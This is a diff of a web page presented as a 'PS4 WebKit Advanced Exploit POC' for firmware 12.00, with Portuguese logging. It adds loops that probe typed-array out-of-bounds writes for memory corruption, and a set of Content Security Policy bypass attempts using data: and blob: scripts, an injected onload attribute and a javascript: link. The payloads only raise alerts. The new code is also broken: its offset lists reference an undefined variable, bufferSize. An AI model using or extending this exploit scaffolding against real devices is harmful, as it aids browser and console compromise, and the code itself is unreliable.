@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Advanced Exploit POC (v12.00) - Sandbox & ASLR Tests</title>
+    <title>PS4 WebKit Advanced Exploit POC (v12.00) - Enhanced Tests</title>
     <style>
         body { font-family: monospace; white-space: pre-wrap; }
         #output { margin-top: 20px; padding: 10px; border: 1px solid #ccc; background-color: #f8f8f8; }
@@ -14,7 +14,7 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit Advanced Exploit POC (v12.00) - Sandbox & ASLR Tests</h1>
+    <h1>PS4 WebKit Advanced Exploit POC (v12.00) - Enhanced Tests</h1>
     <div id="output"></div>
 
     <script>
@@ -23,92 +23,108 @@
             outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
         };
 
-        async function advancedExploitWithSandboxASLRTests() {
-            log("Iniciando Exploit Avançado Combinado com Testes Indiretos de Sandbox e ASLR...", 'critical');
+        async function enhancedExploit() {
+            log("Iniciando Testes Aprimorados de OOB Write e Bypass de CSP...", 'critical');
 
-            // ====================== Fase 1: Tentativa de OOB Write ======================
-            log("\nFase 1: Tentativa de OOB Write...", 'warning');
-            const oobWriteBufferSize = 256;
-            const oobWriteBuffer = new ArrayBuffer(oobWriteBufferSize);
-            const oobWriteView = new Uint8Array(oobWriteBuffer);
-            const oobWriteValue = 0x43; // 'C'
-            const oobWriteOffset = oobWriteBufferSize + 128;
+            // ====================== Fase 1: Testes Aprimorados de OOB Write ======================
+            log("\nFase 1: Testes Aprimorados de OOB Write...", 'warning');
+            const bufferSizes = [32, 128, 512];
+            const writeOffsets = [-64, -32, -1, 0, 1, bufferSize - 2, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 32, bufferSize + 64];
+            const writeValues = [0x00, 0xFF, 0x41, 0x42, 0x43];
+            const readOffsets = [-32, 0, Math.floor(bufferSize / 4), Math.floor(bufferSize / 2), Math.floor(3 * bufferSize / 4), bufferSize - 1, bufferSize, bufferSize + 32];
 
-            try {
-                oobWriteView[oobWriteOffset] = oobWriteValue;
-                log(`Tentativa de escrita OOB no offset ${oobWriteOffset} aparentemente bem-sucedida.`, 'success');
-            } catch (e) {
-                log(`Erro ao escrever OOB no offset ${oobWriteOffset}: ${e.message}`, 'error');
-            }
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            for (const size of bufferSizes) {
+                const buffer = new ArrayBuffer(size);
+                const view = new Uint8Array(buffer);
+                log(`\n--- Testando OOB Write com ArrayBuffer de tamanho: ${size} ---`, 'info');
 
-            // ====================== Fase 2: Tentativa de Bypass de CSP ======================
-            log("\nFase 2: Tentativa de Bypass de CSP...", 'warning');
-
-            // Bypass via data: URI
-            const dataUriScript = document.createElement('script');
-            dataUriScript.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gRXhwbG9pdCwgU2FuZGJveCAmIEFTSVIhJyk7'; // alert('Vupun Exploit, Sandbox & ASLR!');
-            dataUriScript.onload = () => log("<span class='success'>Bypass de CSP via data: URI BEM-SUCEDIDO!</span>", 'success');
-            dataUriScript.onerror = () => log("<span class='error'>Falha no Bypass de CSP via data: URI.</span>", 'error');
-            document.body.appendChild(dataUriScript);
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            // ====================== Fase 3: Testes Indiretos de Fuga de Sandbox ======================
-            log("\nFase 3: Testes Indiretos de Fuga de Sandbox...", 'warning');
-
-            // Tentativa de acessar recursos do sistema de arquivos (improvável de funcionar)
-            try {
-                log("Tentando acessar localStorage de outro 'origin' (potencial sandbox bypass)...", 'info');
-                localStorage.setItem('test_sandbox_bypass', 'test');
-                // Se isso não lançar um erro e persistir entre diferentes "sites" (o que é improvável), pode ser um sinal.
-                log("Tentativa de acesso ao localStorage concluída (resultado não indica bypass direto).", 'info');
-            } catch (e) {
-                log(`Erro ao acessar localStorage: ${e.message}`, 'error');
-            }
-
-            // Tentativa de comunicação cross-origin (pode ser restrita pelo sandbox)
-            log("Tentando enviar mensagem cross-origin (potencial sandbox bypass)...", 'info');
-            const iframe = document.createElement('iframe');
-            iframe.src = 'https://example.com/'; // Um domínio diferente
-            iframe.onload = () => {
-                try {
-                    iframe.contentWindow.postMessage('sandbox_test', '*');
-                    window.addEventListener('message', (event) => {
-                        if (event.data === 'sandbox_response') {
-                            log("<span class='warning'>AVISO: Recebida resposta cross-origin (pode indicar configuração permissiva do sandbox).</span>", 'warning');
+                for (const writeOffset of writeOffsets) {
+                    for (const value of writeValues) {
+                        log(`Tentando escrever 0x${value.toString(16)} no offset: ${writeOffset}`, 'info');
+                        try {
+                            view[writeOffset] = value;
+                            log(`  Escrita no offset ${writeOffset} aparentemente bem-sucedida.`, 'success');
+                            for (const readOffset of readOffsets) {
+                                try {
+                                    const readValue = view[readOffset];
+                                    log(`    Leitura no offset: ${readOffset}, valor: 0x${readValue.toString(16)}`, 'info');
+                                    if (readOffset >= 0 && readOffset < size && readValue === value && writeOffset >= size) {
+                                        log(`<span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA (size=${size}, write=${writeOffset}, read=${readOffset})</span>`, 'critical');
+                                    } else if (readOffset >= 0 && readOffset < size && readValue === value && writeOffset < 0) {
+                                        log(`<span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA (size=${size}, write=${writeOffset}, read=${readOffset}, offset negativo)</span>`, 'critical');
+                                    }
+                                } catch (readError) {
+                                    log(`    Erro ao ler no offset: ${readOffset}: ${readError.message}`, 'error');
+                                }
+                            }
+                        } catch (writeError) {
+                            log(`  Erro ao escrever no offset: ${writeOffset}: ${writeError.message}`, 'error');
                         }
-                    }, false);
-                    setTimeout(() => document.body.removeChild(iframe), 5000);
-                } catch (e) {
-                    log(`Erro ao tentar postMessage: ${e.message}`, 'error');
-                    document.body.removeChild(iframe);
+                        await new Promise(resolve => setTimeout(resolve, 50));
+                    }
                 }
-            };
-            document.body.appendChild(iframe);
-
-            await new Promise(resolve => setTimeout(resolve, 5000));
-
-            // ====================== Fase 4: Tentativas Limitadas de Inferir ASLR ======================
-            log("\nFase 4: Tentativas Limitadas de Inferir ASLR...", 'warning');
-
-            // Tentativa de criar muitos objetos e observar padrões de endereço (altamente não confiável em JS)
-            const objectAddresses = [];
-            try {
-                for (let i = 0; i < 1000; i++) {
-                    const obj = {};
-                    // Não há como obter o endereço real do objeto em JavaScript diretamente de forma confiável.
-                    // Podemos tentar inferir algo com base em comparações ou comportamentos, mas é muito limitado.
-                }
-                log("Criação de muitos objetos concluída (inferência de ASLR via JS é muito limitada).", 'info');
-            } catch (e) {
-                log(`Erro ao criar objetos: ${e.message}`, 'error');
             }
 
-            log("\nTestes Indiretos de Sandbox e ASLR Concluídos.", 'critical');
-            log("Analise cuidadosamente a saída. Resultados positivos NÃO garantem bypass.", 'critical');
+            // ====================== Fase 2: Testes Abrangentes de Bypass de CSP ======================
+            log("\nFase 2: Testes Abrangentes de Bypass de CSP...", 'warning');
+
+            const cspBypassAttempts = [
+                { type: 'data', uri: 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgZGF0YTp1cmkpOw==' },
+                { type: 'blob', code: 'alert("Vupun CSP Bypass! blob:uri");' },
+                { type: 'javascript_onload', code: 'alert("Vupun CSP Bypass! onload attribute");' },
+                // Tentativa com javascript: URI (pode depender da configuração)
+                { type: 'javascript_uri', uri: 'javascript:alert("Vupun CSP Bypass! javascript: URI");', element: 'a', text: 'Clique aqui (javascript: URI)' }
+            ];
+
+            for (const attempt of cspBypassAttempts) {
+                log(`\n--- Tentando Bypass de CSP via: ${attempt.type} ---`, 'info');
+                try {
+                    if (attempt.type === 'data') {
+                        const script = document.createElement('script');
+                        script.src = attempt.uri;
+                        script.onload = () => log(`<span class="success">Bypass de CSP via ${attempt.type} BEM-SUCEDIDO!</span>`, 'success');
+                        script.onerror = () => log(`<span class="error">Falha no Bypass de CSP via ${attempt.type}.</span>`, 'error');
+                        document.body.appendChild(script);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } else if (attempt.type === 'blob') {
+                        const blob = new Blob([attempt.code], { type: 'text/javascript' });
+                        const url = URL.createObjectURL(blob);
+                        const script = document.createElement('script');
+                        script.src = url;
+                        script.onload = () => {
+                            log(`<span class="success">Bypass de CSP via ${attempt.type} BEM-SUCEDIDO!</span>`, 'success');
+                            URL.revokeObjectURL(url);
+                        };
+                        script.onerror = () => log(`<span class="error">Falha no Bypass de CSP via ${attempt.type}.</span>`, 'error');
+                        document.body.appendChild(script);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } else if (attempt.type === 'javascript_onload') {
+                        const div = document.createElement('div');
+                        div.setAttribute('onload', attempt.code);
+                        document.body.appendChild(div);
+                        log(`Elemento div com onload injetado. Verifique o alerta.`);
+                        // Para garantir a execução, podemos tentar manipular o DOM
+                        div.innerHTML = ' ';
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    } else if (attempt.type === 'javascript_uri') {
+                        const link = document.createElement(attempt.element);
+                        link.href = attempt.uri;
+                        link.textContent = attempt.text;
+                        document.body.appendChild(link);
+                        log(`Link com ${attempt.type} injetado. Clique para testar.`);
+                        // A execução deste requer interação do usuário.
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        link.remove(); // Limpar o link após um tempo
+                    }
+                } catch (e) {
+                    log(`<span class='error'>Erro ao tentar bypass via ${attempt.type}: ${e.message}</span>`, 'error');
+                }
+            }
+
+            log("\nTestes Aprimorados Concluídos. Verifique a saída para logs detalhados.", 'critical');
         }
 
-        document.addEventListener('DOMContentLoaded', advancedExploitWithSandboxASLRTests);
+        document.addEventListener('DOMContentLoaded', enhancedExploit);
     </script>
 </body>
 </html>
